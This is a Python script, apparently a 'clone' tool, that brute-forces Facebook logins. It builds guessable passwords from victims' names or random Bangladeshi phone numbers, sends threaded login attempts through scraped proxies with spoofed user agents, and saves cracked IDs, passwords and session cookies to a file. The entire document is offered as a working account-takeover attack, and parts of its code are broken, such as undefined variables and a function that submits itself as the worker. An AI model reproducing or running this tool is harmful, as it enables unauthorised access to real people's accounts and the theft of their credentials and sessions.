#-----------------[ IMPORT-MODULE ]-------------------
import os,sys,time,json,random,re,string,platform,base64,uuid
from bs4 import BeautifulSoup as sop
import requests,bs4,json,os,sys,random,datetime,time,re
import urllib3,rich,base64
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich import print as cetak
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import print as rprint
from rich import pretty
from rich.text import Text as tekz
import time
from datetime import date
from datetime import datetime
from time import sleep
from time import sleep as waktu
pretty.install()
CON=sol()

now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day


from os import path
import os,base64,zlib,pip,urllib
try:
        import os,requests,json,time,re,random,sys,uuid,string,subprocess
        from string import *
        from concurrent.futures import ThreadPoolExecutor as tred
except ModuleNotFoundError:
        os.system(f'pip install requests futures==2 > /dev/null')
except:pass

import os,sys,time,json,random,re,string,platform,base64,uuid
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from time import sleep as waktu
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('pip install bs4')
def cek_apk(session,coki):
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
      print(f'%s{P}[%sðŸ’š%s] %sSorry there is no Active  Apk%s         '%(N,M,N,B,N))
    else:
        print(f'[] %s  Your Active Apps      :{B}'%(GREEN))
        for i in range(len(game)):
            print(f"[%s%s] {H}%s %s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'%s[%s!%s] %sSorry there is no Expired Apk%s                \n'%(N,B,N,M,N))
    else:
        print(f'[âˆš] %s  Your Expired Apps     :{WHITE}'%(M))
        for i in range(len(game)):
            print(f"[%s%s] %s %s"%(N,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))
        else:
            print('\x1b[1;91m \x1b[1;92m\033[1;92m \033[1;93m\033[1;94m\033[1;95m\033[1;96m\033[1;95m\033[1;94m\033[1;96m\033[1;92m5\x1b[1;92m \x1b[1;91m  ')
ugen2=[]
ugen=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
princp=[]
try:
	prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
	open('.prox.txt','w').write(prox) 
except Exception as e:
	print(' \x1b[1;91m\x1b[1;96m\x1b[1;92m \x1b[1;96m[EMRAN-EHC')
prox=open('.prox.txt','r').read().splitlines()
for xd in range(10000):
	a='Mozilla/5.0 (Symbian/3; Series60/'
	b=random.randrange(1, 9)
	c=random.randrange(1, 9)
	d='Nokia'
	e=random.randrange(100, 9999)
	f='/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/'
	g=random.randrange(1, 9)
	h=random.randrange(1, 4)
	i=random.randrange(1, 4)
	j=random.randrange(1, 4)
	k='Mobile Safari/535.1'
	uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
	ugen2.append(uaku)
	aa='Mozilla/5.0 (Linux; U; Android'
	b=random.choice(['6','7','8','9','10','11','12'])
	c=' en-us; GT-'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
for x in range(10):
	a='Mozilla/5.0 (SAMSUNG; SAMSUNG-GT-S'
	b=random.randrange(100, 9999)
	c=random.randrange(100, 9999)
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	h=random.randrange(1, 9)
	i='; U; Bada/1.2; en-us) AppleWebKit/533.1 (KHTML, like Gecko) Dolfin/'
	j=random.randrange(1, 9)
	k=random.randrange(1, 9)
	l='Mobile WVGA SMM-MMS/1.2.0 OPN-B'
	uak=f'{a}{b}/{c}{d}{e}{f}{g}{h}{i}{j}.{k} {l}'
id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]
cokbrut=[]
pwpluss,pwnya=[],[]
j = 'x'
i = 'mbasic'
a = 'm'
b = 'g'
c = 'free'
e = 'web'
f = 'developer'
ugen4=['Mozilla/5.0 (Linux; Android 13.0; Pixel XL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 13.0; Nexus 6P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 13.0; Samsung Galaxy S21) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 13.0; OnePlus 9 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 13.0; Xiaomi Mi 11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 13.0; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 13.0; Samsung Galaxy S20) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 13.0; Samsung Galaxy S10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 13.0; Google Pixel 4a) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 13.0; OnePlus 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 13.0; Google Pixel 4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 13.0; Samsung Galaxy Note 20) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 13.0; OnePlus 9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 13.0; Google Pixel 5a) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 13.0; Samsung Galaxy S21 Ultra) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36']
ugen5=['Mozilla/5.0 (Linux; Android 11; Nokia C2 2nd Edition Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.71 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/396.1.0.28.104;]','Mozilla/5.0 (Linux; Android 11; Nokia C2 2nd Edition Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/94.0.4606.85 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/330.0.0.10.108;]','	Mozilla/5.0 (Linux; Android 11; Nokia C2 2nd Edition Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/94.0.4606.85 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/334.0.0.17.101;]','	Mozilla/5.0 (Linux; Android 11; Nokia C2 2nd Edition Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.85 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/397.0.0.23.404;]','	Mozilla/5.0 (Linux; Android 11; Nokia C2 2nd Edition Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.71 Mobile Safari/537.36[FBAN/EMA;FBLC/en_GB;FBAV/334.0.0.17.101;]','Mozilla/5.0 (Linux; Android 11; Nokia C2 2nd Edition Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/106.0.5249.126 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/321.0.0.13.113;]','	Mozilla/5.0 (Linux; Android 11; Nokia C2 2nd Edition) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 11; Nokia C2 2nd Edition Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.128 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/337.0.0.7.102;]','Mozilla/5.0 (Linux; Android 11; Nokia C2 2nd Edition Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.128 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/397.0.0.23.404;]','Mozilla/5.0 (Linux; Android 11; Nokia C2 2nd Edition Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/97.0.4692.98 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/336.0.0.11.99;]','Mozilla/5.0 (Linux; Android 11; Nokia C2 2nd Edition Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.128 Mobile Safari/537.36[FBAN/EMA;FBLC/en_GB;FBAV/337.0.0.7.102;]','Mozilla/5.0 (Linux; U; Android 11; Nokia C2 2nd Edition Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.128 Mobile Safari/537.36 OPR/10.8.2254.63920','Mozilla/5.0 (Linux; Android 11; Nokia C2 2nd Edition Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.128 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/336.0.0.11.99;]','Mozilla/5.0 (Linux; Android 11; Nokia C2 2nd Edition Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/94.0.4606.85 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/335.0.0.15.96;]','Mozilla/5.0 (Linux; Android 11; Nokia C2 2nd Edition Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.105 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/288.0.0.11.115;]','Mozilla/5.0 (Linux; Android 11; Nokia C2 2nd Edition Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/106.0.5249.126 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/325.0.1.4.108;]','Mozilla/5.0 (Linux; Android 11; Nokia C2 2nd Edition Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/97.0.4692.98 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/288.0.0.11.115;]','Mozilla/5.0 (Linux; Android 11; Nokia C2 2nd Edition Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.141 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/334.0.0.17.101;]','Mozilla/5.0 (Linux; Android 11; Nokia C2 2nd Edition Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.129 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/330.0.0.10.108;]','Mozilla/5.0 (Linux; Android 11; Nokia C2 2nd Edition Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.128 Mobile Safari/537.36[FBAN/EMA;FBLC/en_GB;FBAV/335.0.0.15.96;]']
RED = '\x1b[38;5;208m'
WHITE = '\033[1;92m'
GREEN = '\033[\033[1;92m' 
YELLOW = '\033[1;33m'
BLUE = '\033[1;34m'
ORANGE = '\033[1;35m'
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # 𝑬𝑯𝑪
m = '\x1b[1;91m' #𝑪𝒀𝑩𝑬𝑹
k = '\033[93m' # 𝟗𝟗
h = '\x1b[1;92m' # 𝑬𝑪𝑶
hh = '\033[32m' # 𝑬𝑴𝑹𝑨𝑵
u = '\033[95m' # 𝑬𝑴𝑹𝑨𝑵
kk = '\033[33m' # 𝑬𝑴𝑹𝑨𝑵 -
b = '\33[1;96m' # 𝑬𝑴𝑹𝑨𝑵 -
p = '\x1b[0;34m' # 𝑬𝑴𝑹𝑨𝑵
asu = random.choice([m,k,h,u,b])
def clear():
    os.system('clear')
    banner()
from time import localtime as lt
from os import system as cmd
ltx = int(lt()[3])
if ltx > 12:
    a = ltx-12
    tag = "\x1b[1;91mPM"
else:
    a = ltx
    tag = "\x1b[1;96mAM"

def _EMRAN_(u):
        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.000)        
def banner():
	print(f"""\033[1;32m	
    \033[38;5;46m______  \x1b[38;5;196m__  ___  \033[37;1m____   \033[33;1m___     \033[34;1m_   __
   \033[38;5;46m/ ____/ \x1b[38;5;196m/  |/  / \033[37;1m/ __ \ \033[33;1m/   |   \033[34;1m/ | / /
  \033[38;5;46m/ __/   \x1b[38;5;196m/ /|_/ / \033[37;1m/ /_/ /\033[33;1m/ /| |  \033[34;1m/  |/ / 
 \033[38;5;46m/ /___  \x1b[38;5;196m/ /  / / \033[37;1m/ _, _/\033[33;1m/ ___ | \033[34;1m/ /|  /  
\033[38;5;46m/_____/ \x1b[38;5;196m/_/  /_/ \033[37;1m/_/ |_|\033[33;1m/_/  |_|\033[34;1m/_/ |_/"""  )
def menu():
	os.system('clear')
	banner()
	print('\033[38;5;46m══════════════════════════════════')
	print(f'\033[38;5;46m[𝟏]𝑭𝑰𝑳𝑬 𝑪𝑳𝑶𝑵𝑬 𝑵𝑶𝑻 𝑾𝑶𝑹𝑲❌')
	print('\033[38;5;46m══════════════════════════════════')
	print(f'\033[38;5;46m[𝟐]𝑹𝑨𝑵𝑫𝑶𝑴 𝑪𝑳𝑶𝑵𝑬 𝑵𝑶𝑻 𝑾𝑶𝑹𝑲❌')
	print('\033[38;5;46m══════════════════════════════════')
	print(f'\033[38;5;46m[𝟑]𝑬𝑴𝑨𝑰𝑳 𝑪𝑳𝑶𝑵𝑬 𝑾𝑶𝑹𝑲𝑰𝑵𝑮 (𝑩𝑨𝑺𝑻✅)')
	print('\033[38;5;46m══════════════════════════════════')
	print(f'\033[38;5;46m[𝟒]𝑪𝑶𝑵𝑻𝑨𝑪𝑻 𝑴𝑬')
	print('\033[38;5;46m══════════════════════════════════')
	print(f'\033[38;5;46m[𝟓]𝑬𝑿𝑰𝑻 𝑭𝑼𝑪𝑲 𝒀𝑶𝑼 🚥')
	print('\033[38;5;46m══════════════════════════════════')
	_____EMRAN_____ = input('\033[1;92m[\033[1;34mEHC\033[1;92m]\033[0;92m𝑪𝑯𝑶𝑶𝑺𝑬✏️ :\x1b[1;92m ')
	if _____EMRAN_____ in ['1']:
		C1()
	if _____EMRAN_____ in ['2']:
		Y2()
	if _____EMRAN_____ in ['3']:
		BER()
	if _____EMRAN_____ in ['4']:
		os.system("xdg-open https://t.me/EHC99EMRAN ")
	if _____EMRAN_____ in ['0']:
		exit()			
def tahunng(fx):
	if len(fx)==15:
		if fx[:10] in ['1000000000']       :emran = '2009'
		elif fx[:9] in ['100000000']       :emran = '2009'
		elif fx[:8] in ['10000000']        :emran = '2009'
		elif fx[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:emran = '2009'
		elif fx[:7] in ['1000006','1000007','1000008','1000009']:emran = '2010'
		elif fx[:6] in ['100001']          :emran = '2010-2011'
		elif fx[:6] in ['100002','100003'] :emran = '2011-2012'
		elif fx[:6] in ['100004']          :emran = '2012-2013'
		elif fx[:6] in ['100005','100006'] :emran = '2013-2014'
		elif fx[:6] in ['100007','100008'] :emran = '2014-2015'
		elif fx[:6] in ['100009']          :emran = '2015'
		elif fx[:5] in ['10001']           :emran = '2015-2016'
		elif fx[:5] in ['10002']           :emran = '2016-2017'
		elif fx[:5] in ['10003']           :emran = '2018'
		elif fx[:5] in ['10004']           :emran = '2019'
		elif fx[:5] in ['10005']           :emran = '2020'
		elif fx[:5] in ['10006','10007','10008']:emran = '2021-2022'
		else:emran=''
	elif len(fx) in [9,10]:
		emran = '2008-2009'
	elif len(fx)==8:
		emran = '2007-2008'
	elif len(fx)==7:
		emran = '2006-2007'
	else:emran=''
	return emran
lin= 40* '-'
def C1():
    os.system('clear');
    D().plerr()    
class D:
	def __init__(self):
		self.id = []
	def plerr(self):
		os.system("clear")
		banner()
		try:
			fileX = input ('\033[1;92m[\033[1;32m\033[1;92m]\033[0;92m ENTER YOUR FILE :\x1b[1;93m ') 
			for line in open(fileX, 'r').readlines():
				id.append(line.strip())
			print(f'\033[1;92m[\033[1;32m\033[1;92m]\033[0;92mTOTAL ID : \x1b[1;92m'+str(len(id)))
			Settings()
		except IOError:
			print("\033[1;92m[\033[1;32m\033[1;92m]\033[0;92mFILE %s NOT FOUND\x1b[0m"%(fileX));time.sleep(2)
			F()
def Settings():
	print(f'\033[1;92m[\033[1;33m1\033[1;92m]\033[0;92m CLONE ONLY MIX ID')
	hu = input('\033[1;92m[\033[1;32m\033[1;92m]\033[0;92mCHOOSE :\x1b[1;92m ')
	if hu in ['0','00']:
		muda=[]
		for bacot in sorted(id):
			muda.append(bacot)
		bcm=len(muda)
		bcmi=(bcm-1)
		for xmud in range(bcm):
			id2.append(muda[bcmi])
			bcmi -=1
	elif hu in ['1','01']:
		for bacot in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,bacot)
	else:
		print('\033[1;92m[\033[1;36m\033[1;92m]\033[0;92mWRONG OPTION BARA')
		exit()
	
	print(f'\033[1;92m[\033[1;33m1\033[1;92m]\033[0;92m MOBILE ')
	hc = input('\033[1;92m[\033[1;32m\033[1;92m]\033[0;92mCHOOSE :\x1b[1;92m ')
	if hc in ['1','01']:
		method.append('mobile')
	else:
		methode.append('mobile')
	pwplus=input('\033[1;92m[\033[1;32m\033[1;92m]\033[0;92m PASSWORD MENU \x1b[1;94m MANUAL PASSWORD \x1b[1;91m[M]\n\x1b[1;93m AUTO PASSWORD \x1b[1;96m[A] \x1b[1;92m\n [\033[1;92m\033[1;31m\033[1;92m] CHOOSE : \x1b[1;92m')
	if pwplus in ['y','Y']:
		pwpluss.append('ya')
		print(f'Add Password Manual Minimam 6 Character')
		pwku=input('\033[1;92m[\033[1;32m\033[1;92m]\033[0;92mAdd Password Manual : ')
		pwkuh=pwku.split(',')
		for xpw in pwkuh:
			pwnya.append(xpw)
	else:
		pwpluss.append('no')
	passwrd()
	exit() 
def passwrd():
	os.system('clear')
	banner()
	print('\033[38;5;46m══════════════════════════════════')
	print(f"\033[1;92m[\033[1;92m\033[1;32m\033[1;92m] TOTAL ID       \033[1;34m: \033[0;92m"+str(len(id)))
	print('\033[38;5;46m══════════════════════════════════')
	print(f"\033[1;92m[\033[1;92m\033[1;32m\033[1;92m] START TIME     \033[1;34m: \033[0;96m"+str(a)+":"+str(lt()[4])+" "+ tag+" ")
	print('\033[38;5;46m══════════════════════════════════')
	print(f"\033[1;92m[\033[1;92m\033[1;32m\033[1;92m] START DATE     \033[1;34m: \033[0;92m{ha}\x1b[1;91m/\x1b[1;92m{bu}\x1b[1;91m/\x1b[1;92m{ta} ")
	print('\033[38;5;46m══════════════════════════════════')
	print(f"\033[1;92m[\033[1;92m\033[1;32m\033[1;92m] NOTE = \33[1;92m[USE AIRPLANE MODE ON OF FOR OK IDZ] ")
	print('\033[38;5;46m══════════════════════════════════')
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
			frs = nmf.split(' ')[0]
			pwv = []
			if len(nmf)<6:
				if len(frs)<3:
					pass
				else:
					pwv.append(frs+'@123')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
					pwv.append(frs+'123456')
					pwv.append(frs+'frist123')
					pwv.append(frs+'first last')
					pwv.append(frs+'firstlast')
					pwv.append(frs+'first@@')
					pwv.append(frs+'last123')
					pwv.append(frs+'khan123')
					pwv.append(frs+'i love you')
					pwv.append(frs+'first last')
					pwv.append(frs+'firstslast')
					pwv.append(frs+'first123')
			else:
				if len(frs)<3:
					pwv.append(nmf)
				else:
					pwv.append(nmf)
					pwv.append(nmf+'@@')
					pwv.append(frs+'@123')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
					pwv.append(frs+'123456')
					pwv.append(frs+'first last')
					pwv.append(frs+'frist')
					pwv.append(frs+'last')
					pwv.append(frs+'#@')
					pwv.append(frs+'first last')
					pwv.append(frs+'firstslast')
					pwv.append(frs+'first123')
			if 'ya' in pwpluss:
				for xpwd in pwnya:
					pwv.append(xpwd)
			else:pass
			if 'mobile' in method:
				pool.submit(crack,idf,pwv)
			elif 'free' in method:
				pool.submit(crackfree,idf,pwv)
			elif 'touch' in method:
				pool.submit(cracktouch,idf,pwv)
	print(f"\033[1;92m---------------------------------------------------------")
	print(f' \x1b[1;91m\x1b[1;96m\x1b[1;92m CRACK COMPLETE ')
	print(f' \x1b[1;91m\x1b[1;96m\x1b[1;92m ðŸ¥° OK : {h}%s '%(ok))		
def crack(idf,pwv):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	sys.stdout.write(f"\r{bo} [EMRAN] {h}[{k}{loop}/{len(id)}{h}] {h}[OK] {h}[{ok}] {h}[{''.format(loop/float(len(id)))}] ")
	sys.stdout.flush()
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	for pw in pwv:
		try:
			nip=random.choice(prox)
			proxs= {'http': 'socks4://'+nip}
			ses.headers.update({"Host":'m.facebook.com',"upgrade-insecure-requests":"1","user-agent":ua2,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
			p = ses.get('https://p.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://p.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={"Host":'m.facebook.com',"cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://m.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
			po = ses.post('https://p.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r\x1b[1;91m [\033[1;91mEMRAN-CP\033[1;91m] \033[1;91m '+idf+ ' | '+pw+'')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f'\r\x1b[1;92m [\033[1;92mEMRAN-OK\033[1;92m] \033[1;92m '+idf+ ' | '+pw+'')
				cek_apk(session,coki)
				open('/sdcard/EMRAN-FILE-CLONE-OK','a').write(idf+'|'+pw+'|'+kuki+'\n')
				akun.append(idf+'|'+pw)
				break				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(10)
	loop+=1
loop = 0
cps=[]
oks=[]
def Y2():
    user=[]
    twf =[]
    os.getuid
    os.geteuid
    os.system("clear")
    banner()
    print("\033[38;5;46mWHAT IS YOUR NAME?")
    name=input("\033[38;5;46mUSER NAME : \033[1;92m")
    os.system("clear")
    banner()
    print('\033[1;96mENTER YOUR COUNTRY CODE')
    print('\033[1;96m[BD CODE] \033[1;92m> \033[1;92m 017 - 019 - 018 - 015')
    code = input('\033[1;92mCHOOSE YOUR COUNTRY CODE : ')
    os.system('clear')
    banner()
    limit = int(input('\033[1;92m[]EXAMPLE: 3000, 5000, 15000, 20000\n\033[1;92mCHOOSE CLONING LIMIT : '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(8))
        user.append(nmp)
    with ThreadPool(max_workers=50) as EMRAN:
        clear()
        tl = str(len(user))
        print('\033[38;5;46m══════════════════════════════════')
        print(f"\033[1;92m[\033[1;32m\033[1;92m]\033[38;5;46m 𝑵𝑨𝑴𝑬           \033[1;34m: \033[38;5;46m"+name)
        print('\033[38;5;46m══════════════════════════════════')
        print(f"\033[1;92m[\033[1;32m\033[1;92m]\033[38;5;46m 𝑨𝑮𝑬𝑵𝑻𝑺A         \033[1;34m: \033[38;5;46m"+str(len(ugen)))
        print('\033[38;5;46m══════════════════════════════════')
        print(f"\033[1;92m[\033[1;32m\033[1;92m]\033[38;5;46m 𝑪𝑹𝑨𝑪𝑲 𝑰𝑫       \033[1;34m: \033[38;5;46m"+tl+" ")
        print('\033[38;5;46m══════════════════════════════════')
        print(f"\033[1;92m[\033[1;32m\033[1;92m]\033[38;5;46m 𝑺𝑰𝑴 𝑪𝑶𝑫𝑬       \033[1;34m: \033[38;5;46m"+code)
        print('\033[38;5;46m══════════════════════════════════')
        print(f"\033[1;92m[\033[1;32m\033[1;92m]\033[38;5;46m 𝑺𝑻𝑨𝑹𝑻 𝑻𝑰𝑴𝑬     \033[1;34m: \033[38;5;46m{ha}/{bu}/{ta} ~ {GREEN} "+str(a)+":"+str(lt()[4])+" "+ tag+" ")
        print(f"\033[38;5;46m══════════════════════════════════")
        for love in user:
            pwv = [love,love[2:],love[1:],code+love,code+love[:3],'bangladesh','khan123','11223344','freefire']
            uid = code+love
            EMRAN.submit(EMRAN,uid,pwv,tl)
